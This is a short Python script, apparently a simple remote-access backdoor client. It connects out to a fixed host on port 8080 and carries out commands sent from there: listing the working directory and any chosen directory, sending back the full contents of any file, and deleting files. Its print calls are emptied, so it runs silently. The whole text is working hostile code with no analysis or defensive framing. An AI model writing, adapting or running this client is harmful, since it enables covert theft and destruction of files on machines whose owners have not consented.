import os
import socket
s = socket.socket()
port=8080
host = ('172.18.0.2')
s.connect((host,port))
print("")
print("")

#Connection de la commande

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("")
        print("")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("")

    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")





    else:
        print("")

